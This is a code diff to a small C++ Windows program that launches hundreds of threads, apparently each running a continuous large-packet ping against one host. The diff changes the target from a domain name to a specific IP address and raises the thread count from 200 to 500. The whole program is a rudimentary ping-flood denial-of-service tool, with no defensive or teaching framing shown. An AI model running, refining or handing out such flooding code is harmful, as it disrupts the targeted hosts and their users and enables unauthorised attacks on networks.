@@ -1,7 +1,7 @@
 #include <bits/stdc++.h>
 #include <windows.h>
 using namespace std;
-string cmd = "ping www.metege.com -l 65500 -t -i 112";
+string cmd = "ping 202.117.80.138 -l 6550 -t";
 // string cmd = "Get-Process -Name ping | foreach-object{$_.kill()}";
 
 // void func() {
@@ -17,7 +17,7 @@ DWORD WINAPI Func(LPVOID lpParameter)
 
 int main(int argc, char const *argv[]) {
     // HANDLE ts[100];
-    for (int i=0; i<200; i++) {
+    for (int i=0; i<500; i++) {
         HANDLE ts = CreateThread(NULL, 0, Func, NULL, 0, NULL);
     }
     // Sleep(10);
